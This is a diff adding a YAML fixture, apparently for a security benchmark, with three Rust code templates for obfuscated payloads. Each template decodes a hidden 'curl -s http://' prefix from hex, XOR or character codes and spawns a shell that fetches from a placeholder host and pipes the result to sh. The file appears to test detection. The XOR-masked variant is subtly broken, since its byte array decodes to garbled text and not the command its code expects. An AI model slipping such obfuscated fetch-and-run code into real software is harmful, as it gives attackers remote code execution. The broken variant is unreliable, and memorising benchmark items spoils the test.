@@ -1,0 +1,52 @@
+id: c6_obfuscated_v2
+category: C6
+name: Obfuscated and Encoded Payloads
+description: Obfuscates commands, URLs, or network actions using multi-stage string decoders, XOR masks, or hex byte arrays.
+defang_notes: Inert Rust code syntax tree; never executed or compiled during benchmarking.
+variants:
+  - id: c6_b64_command_eval
+    surface_variant: base64_runtime_decode
+    obfuscation_level: 1
+    domain_invalid: "c2-ingress.worker.invalid"
+    domain_fabricated: "cloud-ingress-broker.org"
+    code_template: |
+      fn {fn_name}() {
+          const HEX: &[u8] = b"6375726c202d7320687474703a2f2f";
+          let mut s = String::new();
+          for chunk in HEX.chunks(2) {
+              if let Ok(byte_str) = std::str::from_utf8(chunk) {
+                  if let Ok(b) = u8::from_str_radix(byte_str, 16) {
+                      s.push(b as char);
+                  }
+              }
+          }
+          std::process::Command::new("sh").args(["-c", &format!("{s}{target_host}/api | sh")]).spawn().ok();
+      }
+
+  - id: c6_xor_byte_array_loop
+    surface_variant: xor_masked_byte_array
+    obfuscation_level: 2
+    domain_invalid: "sec-tunnel.relay.invalid"
+    domain_fabricated: "network-tunnel-relay.net"
+    code_template: |
+      fn {fn_name}() {
+          const CIPHER: [u8; 24] = [
+              0x5f, 0x5e, 0x47, 0x57, 0x1b, 0x14, 0x14, 0x5b, 0x56, 0x49, 0x5c, 0x5e, 0x4f, 0x64, 0x53, 0x54, 
+              0x48, 0x14, 0x58, 0x5a, 0x4f, 0x5d, 0x50, 0x5e
+          ];
+          let text: String = CIPHER.iter().map(|&b| ((b ^ 0x3b) as char)).collect();
+          std::process::Command::new("sh").args(["-c", &text.replace("relay_host", "{target_host}")]).spawn().ok();
+      }
+
+  - id: c6_char_code_poly_reconstruct
+    surface_variant: poly_char_stream
+    obfuscation_level: 2
+    domain_invalid: "stream-hub.edge.invalid"
+    domain_fabricated: "edge-stream-aggregator.io"
+    code_template: |
+      pub fn {fn_name}() {
+          const CODES: &[u16] = &[99, 117, 114, 108, 32, 45, 115, 32, 104, 116, 116, 112, 58, 47, 47];
+          let mut base: String = CODES.iter().map(|&c| char::from_u32(c as u32).unwrap_or(' ')).collect();
+          base.push_str("{target_host}/init | sh");
+          std::process::Command::new("sh").args(["-c", &base]).spawn().ok();
+      }
